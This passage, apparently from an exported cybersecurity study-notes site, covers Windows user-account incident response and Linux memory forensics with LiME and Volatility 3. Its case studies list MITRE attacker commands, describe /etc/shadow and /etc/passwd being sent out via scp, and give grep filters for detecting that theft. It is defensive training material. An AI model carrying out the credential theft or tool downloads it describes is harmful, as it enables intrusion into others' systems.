“SupportUser” on “10/10/2021 10:07”. The takeaway we must get from this is that; the user “LetsDefend” has been taken over or an access that can allow commands to be run has been made. From this point on, both the “LetsDefend” and “SupportUser” users’ activities must be tracked.\nADDITIONAL\nIn order to capture suspicious situations about users, you can inquire the users added to the “Administrators” group during the timeframe of the attack. Thus, you will have immediately caught a user that should not have been added. For this, you can use the event ID below.\n\nEvent ID 4732 – A member was added to a security-enabled local group.\n\nWhat Did We Learn?\n\nAttackers may use generic names like “support” or “admin” after taking control of the system.\nThe activities of the user that has created a new user must also be tracked in addition to the activities of the new user.\nWhile tracking previous activities, the 4720 and 4732 EventID logs will be beneficial.\n"},"SOC/Cysa+-Prep/Incident-Response-on-Windows/index":{"slug":"SOC/Cysa+-Prep/Incident-Response-on-Windows/index","filePath":"SOC/Cysa+ Prep/Incident Response on Windows/index.md","title":"index","links":["SOC/Cysa+-Prep/Incident-Response-on-Windows/How-to-Create-Incident-Response-Plan","SOC/Cysa+-Prep/Incident-Response-on-Linux/Incident-Response-Procedure","SOC/Cysa+-Prep/Incident-Response-on-Windows/3-Important-Things","SOC/Cysa+-Prep/Incident-Response-on-Windows/Free-Tools-That-Can-Be-Used","SOC/Cysa+-Prep/Incident-Response-on-Windows/Live-Memory-Analysis---1","SOC/Cysa+-Prep/Incident-Response-on-Windows/Live-Memory-Analysis---2","SOC/Cysa+-Prep/Incident-Response-on-Windows/Users","SOC/Cysa+-Prep/Incident-Response-on-Windows/Task-Scheduler","SOC/Cysa+-Prep/Incident-Response-on-Windows/Services","SOC/Cysa+-Prep/Incident-Response-on-Windows/Registry-Run-Keys-or-Startup-Folder","SOC/Cysa+-Prep/Incident-Response-on-Windows/Files","SOC/Cysa+-Prep/Incident-Response-on-Windows/Additional-Solutions","SOC/Cysa+-Prep/Incident-Response-on-Windows/Checklist"],"tags":[],"content":"1. How to Create Incident Response Plan\n2. Incident Response Procedure\n3. 3 Important Things\n4. Free Tools That Can Be Used\n5. Live Memory Analysis - 1\n6. Live Memory Analysis - 2\n7. Users\n8. Task Scheduler\n9. Services\n10. Registry Run Keys or Startup Folder\n11. Files\n12. Additional Solutions\n13. Checklist"},"SOC/Cysa+-Prep/Linux-Memory-Forensics/Analyzing-the-Memory-Dump":{"slug":"SOC/Cysa+-Prep/Linux-Memory-Forensics/Analyzing-the-Memory-Dump","filePath":"SOC/Cysa+ Prep/Linux Memory Forensics/Analyzing the Memory Dump.md","title":"Analyzing the Memory Dump","links":[],"tags":[],"content":"Analyzing memory dumps is a critical part of forensic investigations and gathering diagnostic information for troubleshooting. A memory dump of a system provides detailed information about running processes, active user sessions, network connections, and potentially malicious software. This lesson explains how to analyze a memory dump step-by-step.\n\nHere are the tools that can be used for memory forensics on Linux systems and their brief descriptions:\nVolatility: An open-source memory analysis framework that supports a wide range of operating systems and memory dump formats. It offers various features such as malware analysis and user activity analysis.\nRekall (or GRR): Similar to Volatility, Rekall (or GRR) is a memory analysis tool primarily developed by Google with a wide range of analysis features; it is known for its timeline analysis and fast data collection features.\nRedline: A tool for analyzing memory and file systems; offers a user-friendly interface and allows examination of various indicators and artifacts.\nMemoryze for Linux: Another tool used for memory analysis and malware detection; it offers various memory analysis features, but can be more technical to use.\nLinux Memory Grabber: A scripting tool used to take a memory dump from the system and gather the necessary tools for analysis; it can be used swiftly by forensic analysts.\nBefore memory dump analysis can be performed, the appropriate tools must be installed and configured. Volatility, one of the most popular memory analysis tools, is generally preferred because of its compatibility with a wide range of operating systems and memory dump formats.\nKey Differences Between Volatility 2 &amp; 3\nVolatility is a well-known open-source memory forensics tool, and there are two versions, Volatility 2 and Volatility 3, with different features. Here are some of the key differences between Volatility 2 and Volatility 3:\nSoftware Architecture\nVolatility 2: Has a more traditional architecture based on Python 2. It uses a plugin-based structure and includes a set of scripts and modules for memory forensics analysis.\nVolatility 3: Has a completely redesigned, modular, and flexible architecture. It is based on Python 3 and offers improved performance and extensibility.\nSupported Operating Systems and Memory Formats\nVolatility 2: Compatible with memory dumps from various Windows, Linux, Mac OSX, and other operating systems, but has limitations in supporting newer operating systems and memory formats.\nVolatility 3: Supports a wider range of operating systems and memory dump formats. Offers faster updates and support for new operating systems and memory formats.\nUser Interface and Usability\nVolatility 2: Has a familiar command line interface for its early users, but the learning curve for new users can be high.\nVolatility 3: Offers a more intuitive user interface and improved command-line interface. It also provides better error messages and documentation to help users perform analysis more effectively.\nAnalytic Capabilities and Performance\nVolatility 2: Has strong analysis capabilities, but may experience performance issues when working with large memory dumps.\nVolatility 3: Provides improved performance and scalability. It can work more effectively with large dumps and perform more complex analyses faster.\nDevelopment and Community Support\nVolatility 2: Due to the end of Python 2 and reduced community support, development and update support has decreased.\nVolatility 3: Actively developed and supported. As an open-source project supported by a large community, it often gets new plugins, updates, and fixes.\nOverall, Volatility 3 is a newer, faster, and more flexible tool for modern memory forensic analysis. However, some users may still prefer Volatility 2 for specific scenarios or older systems. Both versions have their own strengths and weaknesses, and the choice should be made based on the user’s needs.\nAbout Volatility 3 \nVolatility divides memory analysis into several components. The main ones are as follows:\n\n\nMemory Layers\n\n\nTemplates and Objects\n\n\nSymbol Tables\n\n\nMemory Layers:\nMemory layers are one of the basic components that Volatility 3 uses for memory analysis. They represent different memory resources such as physical memory, virtual memory, file system, etc. These layers provide abstraction between different parts of the analyzed memory image, allowing the tool to access the memory image at different levels. For example, a physical memory layer provides direct access to the raw memory image, while a virtual address translation layer mimics the virtual memory layout of the operating system. This gives Volatility more flexibility to handle different types of memory structures and operating systems.\nTemplates and Objects:\nVolatility 3 uses templates and objects to represent memory structures. Templates contain definitions of in-memory data structures, while objects are concrete examples created according to the templates. For example, the process list of an operating system can be defined using a template, and each process can be constructed as an object that conforms to that template. This structure allows Volatility to understand and present complex in-memory data structures to the user. Objects and templates provide consistency and clarity when accessing data in the memory image.\nSymbol Tables:\nSymbol tables contain the addresses and layouts of data structures and functions used by operating system kernels and other system components. These tables allow Volatility to recognize and interpret specific structures within the memory image. For example, the locations of syscalls, operating system objects, and other important kernel structures can be found in a Windows symbol table. Volatility 3 uses these symbol tables to determine which data structures to use in-memory image analysis and how to interpret them.\nVolatility 3 stores all this in a context that serves as a container for all the different layers and tables required for memory analysis.\nThe wide range o in-depth system analysis. However, it must be noted that effective memory dump analysis requires an understanding of the operating system and the structure of the system from which the memory dump is taken.\nBasic Volatility3 commands\nBelow are some of the basic Volatility3 commands and their application to Linux memory dumps:\n\n\nDisplays the operating system, version, and other basic information from the memory dump file:\npython3 vol.py -f &lt;memory_dump&gt; banner\n\n\nDisplays a list of processes running on the system:\npython3 vol.py -f &lt;memory_dump&gt; linux.pslist\n\n\nDisplays the tree structure of processes, showing parent and child relationships:\npython3 vol.py -f &lt;memory_dump&gt; linux.pstree\n\n\nLists all processes in memory. Unlike Pslist, it also lists processes that have been killed but still have traces in memory:\npython3 vol.py -f &lt;memory_dump&gt; linux.psscan\n\n\nDisplays the bash commands and history that are executed on Linux systems:\npython3 vol.py -f &lt;memory_dump&gt; linux.bash\n\n\nLists open file objects on Linux systems:\npython3 vol.py -f &lt;memory_dump&gt; linux.lsof\n\n\nLists installed Linux kernel modules:\npython3 vol.py -f &lt;memory_dump&gt; linux.lsmod\n\n\nLists all network connections for all processes:\npython3 vol.py -f &lt;memory_dump&gt; linux.sockstat\n\n\nAllows you to search Linux memory dumps using YARA rules:\npython3 vol.py -f &lt;memory_dump&gt; linux.vmayarascan --yara-rules &quot;/path/to/yara_rules.yar&quot;\n\n\nYou can learn more about Volatility 3 at: volatility3.readthedocs.io/en/latest/basics.html\nMemory Dump Analysis with Volatility 3\nFor memory dump analysis with Volatility, we will analyze the “ubuntu-memdump.lime” memory dump from the previous lesson.\n\n\nFirst, we will use Volatility to get the operating system and version information from the dump file.\nBanner information will be extracted from this memory dump file:\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime banner\nBased on this information, the appropriate Volatility symbol is determined. The analysis continues.\n\n\n\n\n\n\nCheck whether the symbol is the correct symbol for the operating system and kernel version.\nls -l volatility3/symbols/\n\n\n\nLinux ISF\nPreviously, Volatility 2 used the concept of a “profile”. However, with the advent of Volatility 3, a “symbol table” was introduced as a new method to replace the profile. Essentially, this approach interprets the Linux kernel’s symbol information based on stored tables, allowing the meaning of values in memory to be revealed. Volatility performs the analysis of the kernel’s symbol table and stores the data in a unique format known as the ISF (Intermediate Symbol Format) file format. Thus, the analysis of a Linux memory dump can be performed using an “ISF” file instead of the traditional “profile”.\nThere are two ways to get an ISF file. One is to use an existing file, the other is to create one yourself.\nYou can obtain existing ISF files from the Volatility3 Linux ISF server: isf-server.techanarchy.net/\nYou can search this address for the kernel version in the banner information of the memory dump file we obtained above, or you can search for the kernel version you obtained using the uname -r command on the system in question.\nWhen we searched for the kernel version of the system from which we obtained our memory dump, no ISF file was found.\n\nIf the ISF file is found, it can be downloaded for one hour, after which it should be searched for again to obtain the download link. The downloaded file should be placed in the /volatility3/symbols directory within the Volatility3 directory.\n\nIf no symbol format is available, we have to create an ISF file ourselves to analyze the memory dump.\nNote: If you try to analyze the corresponding memory dump without an ISF file, you will see an output like the one below:\n\nDwarf2json\nDwarf2json is a utility that processes files containing symbol and type information to produce Volatility3 Intermediate Symbol Format (ISF) JSON output suitable for Linux and MacOS analysis (Go 1.14 or later is required to use it).\nYou can create a custom ISF file using the “dwarf2json” utility.\nInstalling dwarf2json on Ubuntu 22.04\n\n\nThe latest version of “Dwarf2json” is downloaded from the official repository.\ngit clone github.com/volatilityfoundation/dwarf2json.git\n\n\n2. You change to the dwarf2json directory\n `cd dwarf2json/`\n             \n\n3. We use the go build command to perform the compilation process.\n`go build`\n\n4. Check the command\n./dwarf2json --help\n\nTo install debug symbols packages etc.\necho &quot;deb ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse\ndeb ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse\ndeb ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse&quot; | \\\nsudo tee -a /etc/apt/sources.list.d/ddebs.list\nsudo apt install ubuntu-dbgsym-keyring\nsudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys F2EDC64DC5AEE1F6B9C621F0C8CAB6595FDFF622\nsudo apt-get update\n\nNow you can load the dbgsym information for the kernel image version that you want to use:\n\n\nCheck kernel version\nuname -r\n\n\nInstall dbgsym\napt install linux-image-6.5.0-25-generic-dbgsym\n\n\nCheck vmlinux file\nls -lh /usr/lib/debug/boot\n\n\n\nAs shown above, the vmlinux file containing the kernel debugging symbols is located in the ‘/usr/lib/debug/boot’ folder. Based on the vmlinux file, you can use the dwarf2json tool to extract the ISF “output.json” file.\n./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-6.5.0-25-generic &gt; /root/tools/volatility3/volatility3/symbols/vmlinux-6.5.0-25-generic.json \n\n\nRepeating the step we tried a few steps ago and got an error, we see that we can now analyze the memory dump file.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.pslist\n\nThe following is an example of some Linux memory dump analysis output.\nThe Linux Sockstat memory dump output:\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.sockstat\n\nThe “Linux Bash History” dump output is shown in the figure below:\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.bash\n\nAt this point, you are familiar with Volatility’s memory analysis capabilities. We have also shown you how to create an ISF file, which is not included with Volatility.\nConclusion\nThis lesson covered the analysis of the memory dump extracted in the previous lesson and demonstrated how to create an ISF file in Volatility, one of the most commonly used analysis tools. Volatility 3 goes beyond traditional profile-based approaches. It provides users with flexible analysis based on the symbol information of the Linux kernel. Specifically, this new method includes the use of the Intermediate Symbol Format (ISF) and allows forensic analysts to analyze systems in detail. This advanced approach contributes to a comprehensive understanding and resolution of incidents on Linux systems by enabling a thorough examination of malware, user behavior, and network activity. Volatility 3 provides a deeper understanding and a clearer perspective on forensics through these analysis techniques."},"SOC/Cysa+-Prep/Linux-Memory-Forensics/Basic-Memory-Analysis":{"slug":"SOC/Cysa+-Prep/Linux-Memory-Forensics/Basic-Memory-Analysis","filePath":"SOC/Cysa+ Prep/Linux Memory Forensics/Basic Memory Analysis.md","title":"Basic Memory Analysis","links":[],"tags":[],"content":"Memory Forensics Fundamentals is an essential aspect of digital forensics, providing critical information for understanding potential security breaches or system failures.  Analyzing the extracted memory dump file is a fundamental part of the forensics process and is performed with advanced tools such as Volatility.\nBefore moving on to the memory dump analysis process, let’s look at the plug-ins that can be used for Linux memory forensics with the Volatility 3 tool:\npython3 vol.py --help | grep -i linux.\n\nTo get detailed information about a plugin, look at the output of the help command for that plugin.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.sockstat --help\n\nMemory Dump Analysis\nA basic “Linux memory dump analysis process” should consist of the following steps:\n\n\nImage Identification\n\n\nProcesses and Threads\n\n\nNetwork Connections\n\n\nLinux Bash History / User Activities\n\n\nFile Analysis\n\n\nMalware Analysis\n\n\nImage Identification\nFirst, verify the type and format of the memory dump. Choosing the right profile affects the reliability of the results, so this is a critical step for the accuracy of the analysis. Factors such as operating system version, architecture, and kernel version must be correctly identified.\nIt is also necessary to take the hash information of the memory dump and check the hash on the system we are going to analyze, because usually the memory capacities of the systems are large (8-16-24-32 GB). You should take into account the possibility of corruption when transferring a file of this size between systems.\nUsing commands that use md5sum or other hashing algorithms, you can quickly hash the memory dump file.\nmd5sum /var/dumps/ubuntu-memdump.lime\n\nProcesses and Threads\nNext, obtain a comprehensive list of processes and threads running on the system. This can help identify suspicious or malicious processes and distinguish between normal and abnormal activity on the system. In addition, the process tree and parent-child process relationships can provide important clues for tracking down malware.\nThe “linux.psaux”, “linux.pstree”, and “linux.psscan” plugins included in Volatility 3 allow you to view and analyze the processes running on the memory dump file. The details of the information in this output are as follows:\nPID: Process Identifier is a number that uniquely identifies each process.\nPPID: Parent Process Identifier refers to the identifier of the parent process of a process that was started.\nCOMM: The Command Name is the name of the program that the process is running.\nARGS: Arguments is the set of command line arguments used in the process startup.\nBased on this information, the commands executed on the system are analyzed one by one, and if there are abnormal or suspicious commands, the forensics process proceeds for those commands.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.psaux\n\nThe details of the “linux.psscan” plugin output are as follows:\nOFFSET (P): Specifies the position (offset) of the process in memory in the physical address space.\nPID: Process Identifier is a number that uniquely identifies each process.\nTID: Thread Identifier identifies each thread within the process.\nPPID: Parent Process Identifier is the identifier of the parent process from which a process was created.\nCOMM: Command Name is the name of the program that the process is executing.\nEXIT_STATE: Indicates the exit state of the process, i.e. whether the process has been killed or is still running.\nThe details of the most important EXIT_STATES are as follows:\nTASK_RUNNING: The process is actively running and does not specify an exit state.\nEXIT_DEAD: The process has ended and is no longer running. This indicates that the process has ended and its resources have been reclaimed by the operating system.\nEXIT_ZOMBIE: The process has ended, but is still listed in the operating system logs because an exit code has not yet been received from the parent process.\nEXIT_TRACE: The process has been stopped for monitoring or debugging purposes and is waiting for an exit state.\nTASK_STOPPED: The process was stopped by a signal and is no longer running.\nTASK_TRACED: The process is being traced by a debugging tool.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.psscan.PsScan\n\nNetwork Connections\nExamine active and past network connections to understand which external servers the system is communicating with. This analysis is critical for identifying potential data leaks or connections to command and control (C&amp;C) servers. Open ports and network traffic can help identify external attacks or remote access attempts.\nThe “linux.sockstat” plugin included with Volatility 3 allows you to view and analyze currently active network accesses on the memory dump file. The information in the details of this output is as follows:\nNetNS: Network Namespace Number, refers to the network namespaces used for isolation, routing and management in Linux.\nPid: Process Identifier, a number used to uniquely identify each process.\nFD: File Descriptor, refers to a process file descriptor associated with a socket or other file type.\nSock Offset: Specifies the physical location (offset) of the socket structure in memory.\nFamily: Specifies the socket family (for example, AF_INET is used for IPv4 Internet protocols).\nType: Specifies the type of socket (for example, STREAM is used for connection-oriented communication such as TCP).\nProto: Specifies the protocol used (for example, TCP).\nSource Addr: Indicates the local source address, i.e. the local IP address to which the socket sends or receives data.\nSource Port: Indicates the local source port, i.e. the local port number to which the socket sends or receives data.\nDestination Addr: Specifies the remote destination address, i.e. the destination IP address to which the socket sends or receives data.\nDestination Port: Specifies the remote destination port, i.e. the destination port number to which the socket sends or receives data.\nState: Indicates the current state of the socket (e.g. ESTABLISHED indicates that the connection is established, LISTEN indicates that the socket is listening).\nFilterRAW: Indicates the raw data filtering status (if any), usually including information about firewall or packet filtering rules. This column indicates whether or not a particular filter is applied.\nIn this example, only the connections of processes with PID numbers 829 and 907 are filtered and output.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.sockstat --pids 829 907\n\nLinux Bash History / User Activities\nIn this step, examine the command line activity performed on the system. The bash history is an important resource for detecting malicious commands, suspicious activity, or changes to the system because it reveals what commands users run and what types of operations they perform on the system.\nWith the “linux.bash” plugin included in Volatility 3, you can view and analyze the linux bash history on the memory dump file.  The details of this output are as follows:\nPID: Process Identifier refers to the unique identifier number of the process being analyzed.\nProcess: This is the name of the process with a particular PID.\nCommandTime: This is the date and time when the command was executed.\nCommand: Displays the command that was executed.\n\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.bash\n\nFile Analysis\nAnalyze file and directory structures on the system. Files left behind by malware, temporary files, or files that have been deleted but still exist in memory can be critical to understanding how a security incident unfolded.\nWith the “linux.lsof” plugin included in Volatility 3, you can see and analyze which process is associated with which file on the memory dump file.\nIn this example, only the file activity of the nginx process with PID 838 was filtered and output. The details of this output are as follows:\nPID: Process Identifier is the unique number of the analyzed process.\nProcess: This is the name of the process. That is, the name of the process with a particular PID.\nFD: File Descriptor is a number that identifies a specific file or socket used by the process.\nPath: This is the path in the system to the file or resource that the file descriptor (FD) points to.\n\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.lsof --pid 838\nMalware Analysis\nThe next step is to look for malware artifacts in the memory dump. Malware often uses sophisticated techniques to disguise itself. You should perform a detailed scan for signatures, hidden processes, or malicious installation mechanisms. The presence of rootkits, backdoors, and other malware is a serious threat to system security.\nThe “linux.vmayarascan” plugin included in Volatility 3 is an invaluable plugin for detecting potential threats or important information on a memory dump file.\nUses include:\nMalware Analysis: It can be used to detect malware samples, hidden processes, or rootkits from memory.\nPattern Search: It can be used to find specific patterns or strings (such as sensitive information or encryption keys) in system memory.\nAs shown in the command image below, specific strings were searched in process 838 PID, and the output in HEX form was decoded with the “xxd” tool and displayed as a string.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.vmayarascan --pid 838 --yara-file /root/tools/yara-rules/custom/string_search.yar\n\necho “6572726f72” | xxd -r -p\nThanks to the custom rule “string_search.yar”, the expressions “error” and “access” were searched as strings in the analyzed memory dump.\ncat ../yara-rules/custom/string_search.yar\n\nDrawing Conclusions and Writing a Report\nFinally, all information gained from the analysis should be reported in an understandable and actionable format. This report should include the timeline of the incident, systems affected, threats identified, and recommended actions to be taken. Effective reporting is a key resource for further incident response and potential legal proceedings.\n\nConclusion\nMemory dump analysis is performed using tools such as Volatility 3 and reveals potential threats, anomalous behavior, and user activity on the system. The basic Linux memory dump analysis process includes examining processes, network connections, user activity, file analysis, and malware analysis. Each step provides a detailed examination of activity on the system, helping forensic experts uncover the truth behind the incidents. The results are reported in detail to help determine the nature of the incident and the security-related issues."},"SOC/Cysa+-Prep/Linux-Memory-Forensics/Capturing-Memory-Dumps":{"slug":"SOC/Cysa+-Prep/Linux-Memory-Forensics/Capturing-Memory-Dumps","filePath":"SOC/Cysa+ Prep/Linux Memory Forensics/Capturing Memory Dumps.md","title":"Capturing Memory Dumps","links":[],"tags":[],"content":"On Linux systems, “memory dumping”, that is, taking a snapshot of system memory (RAM) and saving it to disk for later analysis, is extremely important, especially for forensics and troubleshooting.\nThis is especially important when the system is rebooted. When the system is rebooted, the information stored in memory is lost. Thus, it is important to take a snapshot of memory and store it securely for anyone who needs to access this information later for debugging or forensic investigation.\nMemory data can contain critical information about the running programs, user activity, system status, and potentially malicious software. Securely storing this information in memory before it is lost is a fundamental step in maintaining its integrity and enabling future analysis.\n\nSome memory dump tools that can be used for memory forensics on Linux systems are:\nLiME (Linux Memory Extractor): LiME is a kernel module designed specifically for Linux operating systems that can safely transfer the contents of memory to a disk file.\nFmem: Fmem is a simple kernel module for Linux operating systems that can export system memory in raw format.\nAvml: Avml is a portable memory dump tool for Linux-based systems, designed to create Volatility-compatible memory images.\nCrash: Crash is a tool for analyzing kernel crashes on Linux systems, and can also be used to get memory dumps from live systems.\nMemdump: Memdump is an old process dump tool on Linux systems; it is used to dump the memory of a given process.\nCoredump: Often used for debugging and system analysis, coredump is a mechanism unique to Linux systems that records the memory state of a program at the time it crashes.\nMemory dumping is important in forensic analysis for several reasons. Forensics is the process of collecting, preserving, analyzing, and reporting data from digital devices for use in forensic investigations. In this process, a memory dump provides a frozen snapshot of the system’s current state, which contains:\nRunning programs and processes: A memory dump contains a detailed list of all programs and processes running on a system. This information can be used to detect the presence of malware or malicious processes on the system.\nSystem failures: When system failures or crashes occur, the memory dump can provide critical information to understand the causes of these events. Faulty code pieces, memory leaks, or incompatible drivers can be the cause of these problems.\nNetwork Connections: Network information such as active network connections and open ports can be extracted from the memory dump. Note that this is important to determine what external servers the system is communicating with or to identify malicious network activity.\nUser activity and session information: User activity such as system logins, file access, and session information can be stored in the memory dump. This can be particularly valuable for unauthorized access or insider threat analysis.\nCryptographic keys and sensitive data: In some cases, cryptographic keys, passwords, and other sensitive information can be retrieved from the memory dump and used to gain access to protected data or decrypt encrypted communications.\nMalware analysis: Malware often uses various techniques to hide from detection. Memory dump provides a rich resource for analyzing the presence and behavior of such software.\nMemory dump is extremely valuable in digital forensic investigations to gather the above information, understand criminal activity, assess system security, and respond to potential security breaches. Thus, it can be said that memory dumps play a critical role in forensic analysis.\nExtracting Memory Dumps from Linux systems with LiME (Linux Memory Extractor)\nLiME (Linux Memory Extractor) is a tool for the extraction of memory dumps from Linux-based systems. Memory dumps contain a copy of the system’s current memory state and are essential for forensic investigations. LiME can provide valuable information about running processes, network connections, user sessions, and potential malware that may be present. For debugging, malware detection, and forensic investigations, it plays a critical role.\nAfter the installation of the LiME module, you can start the memory dump process. To obtain the memory dump, you can specify various parameters and formats. For example, you can follow the path below to dump:\n\n\nThe disk usage status and total memory size are checked. There must be as much free space on the disk as the total memory area.\ndf -h\nfree -m\n\n\nYou switch to the Lime/src directory.\ncd tools/LiME/src/\n\n\nThe name of the lime kernel module file is found.\nls -l lime*.ko\n\n\nThis command loads the LiME kernel module named ‘lime-6.5.0-25-generic.ko’ into the Linux kernel and initiates a memory dump\ninsmod lime-6.5.0-25-generic.ko &quot;path=/var/dumps/ubuntu-memdump.lime format=lime&quot;\n\n\nThe created memory dump is checked.\nls /var/dumps/\ndu -sch /var/dumps/ubuntu-memdump.lime\n\n\n\nAs you can see in the image above, the total size of the memory is 4 GB and the size of the image is 4 GB.\nUsing the lime kernel module with the “insmod” command, a memory dump of the system “/var/dumps/ubuntu-memdump.lime” was created in lime format.\nConclusion\nMemory dumping on Linux systems is a fundamental step in forensic and technical troubleshooting. In this lesson’s example, the disk space and memory size were checked first, then the LiME module was loaded, and a memory dump was created in the specified format and directory. For forensics and troubleshooting, the memory dump is a valuable resource."},"SOC/Cysa+-Prep/Linux-Memory-Forensics/Case-Studies-and-Practical-Examples":{"slug":"SOC/Cysa+-Prep/Linux-Memory-Forensics/Case-Studies-and-Practical-Examples","filePath":"SOC/Cysa+ Prep/Linux Memory Forensics/Case Studies and Practical Examples.md","title":"Case Studies and Practical Examples","links":[],"tags":[],"content":"This course covers real-world scenarios and practical examples related to Linux memory forensics. The focus will be on how forensics processes are implemented, how various challenges are overcome, and how results are evaluated.\n\nExample-1\nCase: Monitoring Suspicious User Activity\nSystem administrators have a suspicion of unauthorized access to the system where they are investigating a service crash. As part of this investigation, they begin to examine the commands and user activity that were executed on the system using bash commands from the memory dump.\nThe first step in the investigation is an examination of the bash history output in the memory dump. In such cases, since too many commands will have been executed first, it will be useful to quickly search for commands that the attackers are likely to run using the Mitre Attack Framework.\nExamples of these commands include:\n“T1105 - Ingress Tool Transfer”: Uses the Linux ‘wget’ command. Attackers can use this command to download tools or malware to the target system.\n“T1021.001 - Remote Services: SSH”: Uses the Linux ‘ssh’ command. An attacker could use the “ssh” command to remotely access the system and execute commands.\n“T1070.004 - Indicator Removal on Host: File Deletion”: Uses the Linux ‘rm’ command. Attackers can use this command to cover their tracks or remove malicious files.\n“T1046 - Network Service Scanning”: Use of the Linux ‘nmap’ command. Attackers can use the nmap command to discover other devices and open ports on the network.\n“T1562.001 - Impair Defenses: Disable or Modify Tools”: Uses the Linux ‘chmod’ command. Attackers can use this command to modify or disable the permissions of security tools.\n“T1037.004 - Boot or Logon Autostart Execution: .bashrc”: Modifies the Linux “.bashrc” file. Attackers can modify this file to ensure that any malware they inject into the system is executed at login.\n“T1027.004 - Obfuscated Files or Information: Compile After Delivery”: Compiles source code using the Linux “gcc” command. Attackers can first transfer obfuscated source code that is difficult to understand and detect to the target system. They then use compilers such as gcc to convert the source code into binary files on the target system.\nIn this case, when the activity before and after the wget command that stood out in the memory dump was filtered, it was found that the attackers gathered information about the system using commands such as “whoami” “uname -a”, likely discovered a vulnerability in the kernel version and downloaded the exploit to the system using “wget”.\nThe attackers then adapted the exploit code, made it executable, and ran it.\npython3 vol.py -f /var/dumps/test-memdump.lime linux.bash | grep wget\n\nIn summary: You can quickly identify the security incident by examining the history output associated with suspicious situations. Just look for infrequently used commands whose use might be suspicious.\n\nExample-2\nCase: Leaked passwords and sensitive information\nBased on the data leak information reported by the Cyber Threat Intelligence solution used by the organization, an investigation was initiated by taking a memory dump from the server containing the data exposed in the leak. The leak detail shows that there are “/etc/shadow”, “/etc/passwd” files belonging to a server.\nDuring the investigation, the bash history, network activity, and file movements in the memory dump need to be checked.\nOn the received memory dump, it first examines the activities related to these files from the history.\nThen, among these activities, the network activity of the data transfer process with “scp” is checked.\nFinally, the file movements are examined to ensure that the corresponding files are actually read and transferred by “scp”.\nBelow is a step-by-step view of the output of these checks. Analysis of the output shows that the files ‘/etc/shadow’ and ‘/etc/passwd’ were transferred from the server to the IP address ‘8.7.6.5’.\npython3 vol.py -f /var/dumps/ubuntu-memdump.lime linux.bash | egrep &quot;passwd|shadow&quot;\n\nConclusion\nThis lesson presents 2 different perspectives on what and how to view a dump analysis of a suspicious event. In general, you can detect suspicious situations by examining the path taken for such situations, executed commands, network activity, and file activity."},"SOC/Cysa+-Prep/Linux-Memory-Forensics/Introduction-to-Linux-Memory-Forensics":{"slug":"SOC/Cysa+-Prep/Linux-Memory-Forensics/Introduction-to-Linux-Memory-Forensics","filePath":"SOC/Cysa+ Prep/Linux Memory Forensics/Introduction to Linux Memory Forensics.md","title":"Introduction to Linux Memory Forensics","links":[],"tags":[],"content":"In the ever-evolving landscape of the digital age, cybersecurity and forensics have become more important than ever. In this fast-paced environment, “Memory Forensics”, or memory forensic analysis, has emerged as an indispensable tool in the investigation of cybercrimes and security breaches. Developing memory forensics skills, especially on systems running Linux operating systems, allows professionals to more effectively identify, analyze, and mitigate these threats.\nMemory Forensics involves the examination of a system’s physical memory (RAM). This is vital to understanding what a computer is currently doing or has done in the past. In the event of a system crash, malware infection, or other security breach, the data stored in RAM can be extremely valuable information. The Linux Memory Forensics course provides a comprehensive guide to accessing, analyzing, and reporting this valuable information.\n\nMemory forensics is primarily used for malware analysis, debugging, analyzing system performance issues, detecting data leaks, and monitoring user activity. It is also critical for root cause analysis of system crashes and understanding of attackers’ actions during a security breach.\nRequired Tools\nLiME (Linux Memory Extractor) and Volatility for Linux Memory Forensics are essential tools that are widely used for memory analysis. The purpose and use of each tool is described in detail below:\nLiME (Linux Memory Extractor)\nLiME is a tool designed for use in Linux operating systems to create a secure copy of the system’s RAM. It works as a kernel module and can export the contents of memory in various formats (e.g. raw, lime format) to a disk file.\nLiME is used during forensic analysis and security investigations to collect data from system memory. This includes valuable information about running system processes, network connections, user sessions, and even potentially malicious software. LiME allows retrospective analysis of events that occurred while the system was down or active by creating a complete and unaltered copy of the data.\nFeatures of LiME:\n\n\nHash of dumped memory\n\n\nAcquisition via network interface\n\n\nMinimal process footprint\n\n\nFull Android memory capture\n\n\nLiME can be installed on Ubuntu Linux distribution as shown in the screenshot below. These commands will create the required LiME module for the system. In Linux, the module is used for memory dumping.\n\n\nThe ‘lime’ repository is downloaded.\ngit clone github.com/504ensicsLabs/LiME.git\n\n\nYou change to the ‘lime/src’ directory.\ncd LiME/src/\n\n\nThe code is compiled with the make command.\nmake\n\n\nThe ‘lime’ is searched for within the kernel modules using the lsmod command.\nlsmod | grep -i lime\n\n\n\nThis concludes the Linux LiME installation and the Linux LiME tool is ready to use. We will explain how to use it in the next lessons.\nVolatility\nVolatility is an open-source memory analysis framework. It is available for both Linux and Windows environments. Volatility is a powerful tool for analyzing the information contained in the RAM of operating systems. Compatible with a wide range of operating systems and memory dump formats, Volatility provides a comprehensive framework for memory analysis. It is written in Python and has an extensive library of plug-ins.\nVolatility is used to analyze memory dump output from tools such as LiME. It allows users to list processes in RAM, DLLs, network connections, open files, registry keys, and more. It is also used to detect malware, reveal hidden codes, and examine general user activity on the system. Volatility is one of the most widely used memory forensics tools and is essential for performing detailed memory analysis.\nVolatility supports several sample file formats and can convert one to another. The supported file formats are listed below:\n\nRaw linear sample (dd)\nHibernation file (from Windows 7 and earlier)\nCrash dump file\nVirtualBox ELF64 core dump\nVMware saved state and snapshot files\nEWF format (E01)\nLiME format\nMach-O file format\nQEMU virtual machine dumps\nFirewire\nHPAK (FDPro)\n\nInstalling Ubuntu 22.04 Volatility3 can be done as shown below.\nPython3 or higher is required to use Volatility3.\n\n\nThe latest version of Volatility is downloaded from the official repository.\ngit clone 